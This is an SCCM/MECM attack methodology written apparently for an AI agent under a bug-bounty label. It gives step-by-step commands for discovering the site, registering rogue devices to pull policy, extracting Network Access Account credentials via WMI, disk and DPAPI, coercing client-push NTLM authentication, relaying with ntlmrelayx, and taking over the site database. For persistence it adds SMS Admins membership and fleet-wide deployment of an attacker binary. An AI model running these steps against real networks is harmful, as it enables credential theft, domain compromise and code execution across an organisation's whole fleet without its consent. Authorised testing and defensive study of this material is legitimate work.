---
technology: "SCCM / MECM (Microsoft Configuration Manager)"
kind: bug-bounty-methodology
audience: ai-agent
family: windows
provenance: "thin unit — first-class depth, upstream research heavy. Evidence: one relay chain (ntlmrelayx + SCCMPoliciesAttack/SCCMDPAttack against MP HTTP; ghostsurf noted as the packaged successor). Upstream: SpecterOps posts.specterops.io (Coercing NTLM Authentication from SCCM, Apr 2022; Relaying NTLM Authentication from SCCM Clients, Jun 2022; The Phantom Credentials of SCCM), Guidepoint Security (Automatic Client Push & AD System Discovery, 2024; Compromising Network Access Accounts), Truesec 'SCCM Tier Killer', Palo Alto Unit 42 SCCM parts 1-2, Microsoft Learn (security-and-privacy-for-clients, Enhanced HTTP, accounts). Commands reproduced from upstream docs; lab-safe values substituted. Verified 2026-11-12."
---

# SCCM / MECM bug bounty methodology

Target model: an enterprise Windows estate running Configuration Manager — a
site server with management point (MP) and distribution point (DP) roles, a
site database, and domain-joined clients. You may start as: a domain user, a
user on a managed workstation, local admin on a client, or a relay position.
Companion overview: [[sccm|SCCM / MECM]].

## Triage table

| Surface | Gate | Min privilege | Payoff |
|---|---|---|---|
| Site/MP discovery | AD readable | any domain user | MP FQDN, site code, HTTP/HTTPS posture |
| Rogue device registration + policy pull (MP HTTP) | PKI not enforced | domain user (machine-quota) or machine acct | NAA credentials in policy — High |
| NAA from client (WMI / OBJECTS.DATA) | local admin on an SCCM client (disk method: file read only — DACL is world-readable) | low (disk) / admin (WMI) | cleartext domain creds — High |
| Client-push coercion | automatic client push + "Allow connection fallback to NTLM" + no PKI | low-priv domain user | MP installation/machine account NTLM → relay/crack — High |
| Relay to MP/DP HTTP apps | MP/DP over HTTP, signing not enforced (DP) | relay capability (coerced auth) | Policy + DP control — High→Critical |
| Site database admin | over-priv NAA/service acct reaches SQL (`sa` on `CM_<SITECODE>`) | varies | Full site admin — Critical |
| SMS Admins / Full Administrator persistence | any site-admin foothold | admin | Persistence across rebuilds — Critical |

## Phase 0 — Find the site

From any domain user context:

- LDAP: the **System Management container** (`CN=System Management,CN=System,DC=...`)
  holds the site server objects and their SPNs; SCCMHunter's `find` module does
  this plus fuzzy matching for "SCCM"/"MECM" names, and reports SMB-signing
  status and site/DP/WSUS roles for each hit.
- Ports: MP answers HTTP(S) with SCCM-specific paths; SQL (1433) on the site
  DB; 8530/8531 hint WSUS co-hosted. `nmap -sV` against site-server candidates.
- On a managed client you already control:

```powershell
SharpSCCM.exe local siteinfo     # prints MP FQDN + site code (3 chars after "SMS:")
```

Record: MP FQDN, site code, and whether `/ccm_system/request` answers over
plain HTTP (the fork in every later phase: HTTP = the whole HTTP attack
family is live; HTTPS-only/PKI = pivot to client-side and database paths).

## Phase 1 — MP HTTP: register, then pull policy

Where client PKI is not required, the MP's policy endpoints accept
machine-authenticated HTTP. Unapproved devices are denied *secret* policies —
the bypass is to register a new device (a machine account you create; default
AD quota lets one user create 10):

```text
1. register:   POST http://<MP>/ccm_system_windowsauth/request   (new device record)
2. all policy: POST http://<MP>/ccm_system/request               (CCM_POST, XML client data)
3. specific:   GET  http://<MP>/SMS_MP/.sms_pol/{GUID}           (one policy by GUID)
```

Packaged implementations (no hand-rolled HTTP):

```bash
# SCCMHunter http module — registers a device, downloads + de-obfuscates policy:
python3 sccmhunter.py http -u user -p 'pw' -d lab.corp -dc-ip 198.51.100.10 -ldaps -auto

# sccmsecrets.py (Truesec) — same idea, explicit MP and client name:
python3 SCCMSecrets.py policies --management-point http://sccm01.lab.corp --client-name patshehe
```

Hunt the returned policies for `NetworkAccessUsername`/`NetworkAccessPassword`
`<PolicySecret>` blobs → Phase 2 for decryption.

## Phase 2 — NAA credentials, three ways

**A. WMI on a client (needs high integrity):**

```powershell
Get-WmiObject -Namespace "root\ccm\policy\Machine\ActualConfig" -Class CCM_NetworkAccessAccount
# returns DPAPI blobs (PolicySecret CDATA) for username + password
SharpSCCM.exe local secrets -m wmi          # automated, decrypts in-process
SharpSCCM.exe local secrets -m disk         # parses OBJECTS.DATA instead — finds *old* NAAs too
```

**B. Disk / CIM repository (lowest privilege):** the blobs physically live in
`C:\Windows\System32\wbem\Repository\OBJECTS.DATA`, whose DACL permits
world-read — any user can `strings` it for `<PolicySecret` blobs; decrypt with
the **system** DPAPI masterkey (machine key, not a user password):

```bash
# from Linux, as admin over the wire:
python3 sccmhunter.py dpapi -u user -p 'pw' -d lab.corp -dc-ip 198.51.100.10 -both
# or SharpDPAPI's SCCM command on-host (queries WMI, pulls system masterkeys, decrypts)
```

**C. Policy pull (Phase 1 output):** same blob shape, decrypt with system key
or via SCCMHunter's `http` module which handles it end-to-end.

Then: check the NAA's *actual* privileges — the account "should" only read
DP content, but engagements (Truesec, Unit 42) repeatedly find NAAs that are
local admin on member servers, can modify privileged groups, or reach the
site database. Also try historically: disk method surfaces decommissioned
"phantom" NAAs — disabled or not, test them.

## Phase 3 — Client push: make the MP authenticate to you

Prerequisites (SpecterOps, Apr 2022): automatic site-wide client push
installation + automatic site assignment enabled, "Allow connection fallback
to NTLM" checked, PKI certificates not required, MP can reach you on 445
(or HTTP any port when WebClient is enabled on the server).

Mechanics: register/request as in Phase 1 but advertise your host (NetBIOS /
FQDN / IP) — the site attempts client push to *you*: the **client push
installation account** (frequently a local-admin-everywhere account) or the
MP's **machine account** authenticates over SMB → capture (crack the
challenge) or relay. Guidepoint's variant rides **AD system discovery**:
attacker-controlled DNS/computer records get *discovered*, automatic push
follows — site takeover when the push account is privileged.

Hardening tell that kills this: Microsoft's client guidance allows requiring
Kerberos mutual authentication for client push (no NTLM fallback). A push
attempt that never arrives usually means exactly that — move to relay-inbound
or client-side phases instead.

## Phase 4 — Relay into the MP/DP applications themselves

With a coerced or captured NTLM session (PetitPotam/PrinterBug-era coercion
still being the trigger), relay **into SCCM's HTTP applications** — the
observed chain, matching Impacket's SCCM attack modules:

```bash
# Impacket ntlmrelayx with SCCM attack classes (stock ntlmrelayx now carries them;
# the chain patched httpattack.py — SCCMPoliciesAttack + SCCMDPAttack — before
# upstream integration; "ghostsurf" packages the same flow):
ntlmrelayx.py -t http://sccm-mp.lab.corp --http-port 8888 \
  --no-smb-server --no-rdp-server --no-mssql-server --no-rpc-server \
  --keep-relaying -socks
# relayed identity lands as an authenticated HTTP session on the MP/DP:
#   SCCMPoliciesAttack -> dump policies (NAA inside)
#   SCCMDPAttack       -> distribution point abuse (content write = execution fleet-wide)
```

SpecterOps' companion post shows the reverse direction too: any *client* can
be made to authenticate (its machine account, on DDR/heartbeat triggers) when
auto-push is on — `SharpSCCM` triggers DDRs collection-side, scale is your
only constraint.

## Phase 5 — Site database and persistence

- **SQL on `CM_<SITECODE>`:** SCCM administration is rows in this database; a
  service account or NAA with `sa`-level reach promotes itself to Full
  Administrator by editing table entries (Truesec's tier-killer cases). Check
  `mssql` unit methodology for reaching/using it.
- **SMS Admins / RBAC:** once Full Administrator, standard persistence is
  membership in SMS Admins + an application deployment (your own binary,
  fleet-wide) — the "malicious activity indistinguishable from admin work"
  property defenders cite.
- **MDT integrations:** `CustomSettings.ini` and `bootstrap.ini` on
  deployment shares carry cleartext service credentials far too often —
  include `Packages$`-style shares in sweep patterns (Truesec case).

## Quick reference

```bash
# discovery
SharpSCCM.exe local siteinfo                       # on a client
python3 sccmhunter.py find -u u -p p -d lab.corp -dc-ip 198.51.100.10
# NAA
SharpSCCM.exe local secrets -m wmi ; SharpSCCM.exe local secrets -m disk
python3 sccmhunter.py http -u u -p p -d lab.corp -dc-ip 198.51.100.10 -ldaps -auto
python3 sccmhunter.py dpapi -u u -p p -d lab.corp -dc-ip 198.51.100.10 -both
# relay
ntlmrelayx.py -t http://<MP> --keep-relaying -socks   # + SCCM attack modules
```

## Tool mapping (prose)

SharpSCCM (Mayyhem/SharpSCCM) is the on-host C# workhorse — `local siteinfo`,
`local secrets` (wmi/disk), `get secrets`, DDR triggers. SCCMHunter (Garrett
Foster) is the Python suite: `find` (AD discovery), `http` (rogue device +
policy pull), `dpapi` (blob decryption), plus admin modules. sccmsecrets.py
(Truesec-adjacent) does policy pulls with explicit MP targeting. Impacket's
ntlmrelayx carries SCCMPoliciesAttack and SCCMDPAttack for HTTP relays;
ghostsurf packages the flow. SharpDPAPI's SCCM command decrypts NAA blobs
with system masterkeys; DPLoot and SystemDPAPIdump do the same from Linux.
Coercion primitives (PetitPotam and friends) and AD object creation (any
domain user's machine quota, or Powermad's New-MachineAccount) supply the
identities the MP endpoints consume. The [[mssql]] unit covers the site
database; [[wsus]] often co-hosts on the same server.
